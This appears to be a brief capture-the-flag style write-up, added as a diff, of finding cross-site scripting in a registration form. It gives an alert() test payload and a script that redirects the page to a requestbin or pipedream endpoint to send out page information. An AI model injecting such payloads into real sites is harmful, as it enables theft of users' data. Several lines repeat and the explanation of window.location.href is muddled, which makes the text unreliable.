@@ -1,0 +1,13 @@
+register , in submission bar write easy js alert 
+<script>alert("test");</script> 
+website has XSS  vulnerability so next I tried to redirect url to my custom endpoint for this I used window.location.href.
+window.location. contains  page information
+And href is property that allows us to send this information 
+As end point I used requestbin 
+so next I tried to redirect url to my custom endpoint for this I used window.location.href.
+window.location. contains  page information
+And href is property that allows us to send this information 
+As end point I used requestbin 
+<script>
+window.location.href = "http....pipedream..
+</script>
